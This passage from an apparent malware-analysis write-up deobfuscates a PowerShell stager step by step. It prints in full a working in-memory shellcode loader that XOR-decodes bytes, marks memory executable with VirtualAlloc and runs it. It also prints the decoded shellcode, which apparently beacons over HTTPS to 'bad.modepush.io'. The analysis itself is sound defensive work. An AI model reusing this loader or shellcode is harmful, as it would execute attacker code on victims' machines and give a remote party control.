i9TrtSC4RXhuz68bHxxcI73KxpCg+YW9DrTJTPTWqVWinqqdmtZj7fVh44sdZu5eoA/mL8syTz5ac1BIca3bPRZ77+Z75rwfwndF/hzYBL23qPqBLHfo5XsVc/msuJ67/AfzxMbTP8MmC90w3JV9I9YDebYkB3zfphV241YuM2NeYW535xtxBeGzYqMNHTrCJktubyb7Z/mKOup0J/sVMMcLQc9+NiAEsxdCEJapTJcnm3Lfc3wo4tS4EDgAA"));Write-Host (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
I took the code from above and made a small change from IEX to Write-Host. this allows the code to be deobfuscated in powershell without detonating or running the malicious code. Instead Write-Host will print the deobfuscated code to the screen. 

### Output:
```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
        Param ($var_module, $var_procedure)
        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
        )

        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

        return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw')

for ($x = 0; $x -lt $var_code.Count; $x++) {
        $var_code[$x] = $var_code[$x] -bxor 115
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
        start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
        IEX $DoIt
}
```
This is more Powershell code

### Break Down 3:
1. Set-StrictMode -Version 2: When Strict Mode is enabled, violating the set programming rules will produce terminating errors in our scripts. Strict Mode to Version 2.0 will prohibit you from referencing variables that have not been initialized. It will also prohibit you from referencing initialized variables, in addition to prohibiting references to non-existent properties on objects, function calls using the syntax for calling methods, and variables without names.
2. $DoIt: declaring a variable that is equal to everything between the 'at' signs '@'
3. func_get_proc_address: retrieve the address of a function within a specified DLL
4. func_get_delegate_type: create a custom delegate type dynamically at runtime, specifying its parameter types and return type
5. [Byte[]]$var_code: variable containing raw byte array. 
6. BASE64 (3): base64 code is easily decoded using cyberchef with the options "from base64" no other options needed. however this is also binary and not human readable. 
``` 
ússsúB¡ø!Cø!ø!gø[|Ä9UBB³ßOq_S²¼~r´!$ø!cø1Or£ø3ö³9r£#ø;kø+Sr O:øGør¥BB³ß²¼~r´KpHW+ø+Wr ø8ø+or øwør£ú7WW((*)"+,)øaõ.s'?Ut¦ssssB$$$$$I%
Ô¦×sss(Bº""p""Èrss #$úìµ¦#ÿsss(B¡!sA³÷!!! !#&]H¦úµð°#ó@ssúw#l%5íõ¦,B$$ %^uk¦ö³|÷¹rssBöwúzÙ¶.¦ú²6R-B¦B$t"%#Ä$x¦Ìs\ssJ´t+#Bârssºrss\6)$sx$ØTðÂÇÓõ©ûcÇÞëÖ©Òºë9ÎÑ¨øf¨3#&ÀfGò®äÏ¶¾é?{ï'OÊüä/©ù	º5kýs&^2IS>	\F]CS[HS> :6SJ]CHS$S='SE]BHS'\F]CHS1<:6JH#'1!Z~ys¨ËÕþcöHðð´ªS~¿¿5¹+-ÉV£Ñ:ÉKÍWeÔcß]K`	ôJâ.ÿHùfÅDÞx2)M±ºwÅ`dÑå'VB+qr6þÐÓ8[°¤Õèâ´u¾­Õ·[ùYéö?¹Ô¥°´_MìÝHFàMI"ÜJ``bN.Éã=g³ô6Éý±$î)È¥{[´x2óuÂÔ#¬¦5meÉ«óû*VC$<º@¶ ¬#êñå2sÆÑ%¦3scssss3s$+× ¦àÊssssrª" ú$sSss %aåú¦ö³µøtr°ö³+°ú]]ssssp
```
7. for loop: goes through each byte from the previous array and xors it with with they byte value 115 to get the real byte. 
8. $var_va: gets functions pointers and passes them to functions identified earlier. 
9. $var_buffer: 0x3000 indicates “reserve and commit this memory”, and the 0x40 indicates “this memory should be readable, writable, and executable.”
10. [System.Runtime.InteropServices.Marshal]::Copy: Copies data from a managed array to an unmanaged memory pointer, or from an unmanaged memory pointer to a managed array.
11. $var_runme: retrieves a function pointer stored in $var_buffer and then invokes it with IntPtr::Zero
12. If: checks if system is 64bit using [IntPtr]::size -eq 8
    - if 64bit run with parameters/arguements as 32bit
    - else invoke-expresion $DoIt


## $var_code Deobfuscation:
I modified the code to get the byte array
```powershell
$DoIt = @'
[Byte[]]$var_code = [System.Convert]::FromBase64String('j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw')

for ($x = 0; $x -lt $var_code.Count; $x++) {
        $var_code[$x] = $var_code[$x] -bxor 115
}

write-host $var_code
'@
```
### Execute modified code:
```powershell
iex $DoIt
```

### Output:
```
252 232 137 0 0 0 96 137 229 49 210 100 139 82 48 139 82 12 139 82 20 139 114 40 15 183 74 38 49 255 49 192 172 60 97 124 2 44 32 193 207 13 1 199 226 240 82 87 139 82 16 139 66 60 1 208 139 64 120 133 192 116 74 1 208 80 139 72 24 139 88 32 1 211 227 60 73 139 52 139 1 214 49 255 49 192 172 193 207 13 1 199 56 224 117 244 3 125 248 59 125 36 117 226 88 139 88 36 1 211 102 139 12 75 139 88 28 1 211 139 4 139 1 208 137 68 36 36 91 91 97 89 90 81 255 224 88 95 90 139 18 235 134 93 104 110 101 116 0 104 119 105 110 105 84 104 76 119 38 7 255 213 232 0 0 0 0 49 255 87 87 87 87 87 104 58 86 121 167 255 213 233 164 0 0 0 91 49 201 81 81 106 3 81 81 104 187 1 0 0 83 80 104 87 137 159 198 255 213 80 233 140 0 0 0 91 49 210 82 104 0 50 192 132 82 82 82 83 82 80 104 235 85 46 59 255 213 137 198 131 195 80 104 128 51 0 0 137 224 106 4 80 106 31 86 104 117 70 158 134 255 213 95 49 255 87 87 106 255 83 86 104 45 6 24 123 255 213 133 192 15 132 202 1 0 0 49 255 133 246 116 4 137 249 235 9 104 170 197 226 93 255 213 137 193 104 69 33 94 49 255 213 49 255 87 106 7 81 86 80 104 183 87 224 11 255 213 191 0 47 0 0 57 199 117 7 88 80 233 123 255 255 255 49 255 233 145 1 0 0 233 201 1 0 0 232 111 255 255 255 47 69 90 87 102 0 107 111 11 87 171 39 131 177 180 160 134 218 136 16 228 180 123 173 246 152 165 218 120 161 201 152 74 189 162 219 245 139 21 219 64 80 85 179 21 110 246 52 129 114 221 151 188 197 115 205 154 76 8 156 84 60 238 124 185 143 151 106 92 247 218 138 122 201 70 24 100 231 142 0 85 115 101 114 45 65 103 101 110 116 58 32 77 111 122 105 108 108 97 47 53 46 48 32 40 99 111 109 112 97 116 105 98 108 101 59 32 77 83 73 69 32 57 46 48 59 32 87 105 110 100 111 119 115 32 78 84 32 54 46 49 59 32 84 114 105 100 101 110 116 47 53 46 48 59 32 66 79 73 69 57 59 80 84 66 82 41 13 10 0 219 117 184 166 107 141 242 16 133 59 131 102 131 199 240 217 104 250 32 100 13 204 244 204 70 202 88 249 94 186 37 208 162 73 186 56 190 99 240 36 22 116 167 16 246 172 46 105 236 56 19 100 249 245 122 135 234 57 145 93 140 59 105 138 21 182 55 173 11 65 97 90 62 194 201 12 4 182 19 23 246 162 150 84 117 37 49 88 2 1 233 69 141 163 226 160 75 40 195 215 166 155 226 228 234 145 230 199 6 205 235 222 166 196 40 247 138 42 154 110 133 76 202 96 167 214 195 116 199 44 62 159 174 232 59 53 251 147 62 58 81 175 57 19 19 103 17 124 61 233 112 93 186 144 78 20 192 135 69 186 142 194 87 157 90 237 187 214 8 40 199 11 65 128 111 117 246 6 177 167 80 223 213 70 30 22 186 216 116 232 104 128 136 89 37 48 87 79 201 51 120 197 83 104 103 249 223 125 80 153 130 150 65 0 104 240 181 162 86 255 213 106 64 104 0 16 0 0 104 0 0 64 0 87 104 88 164 83 229 255 213 147 185 0 0 0 0 1 217 81 83 137 231 87 104 0 32 0 0 83 86 104 18 150 137 226 255 213 133 192 116 198 139 7 1 195 133 192 117 229 88 195 232 137 253 255 255 98 97 100 46 109 111 100 101 112 117 115 104 46 105 111 0 0 0 0 3
```
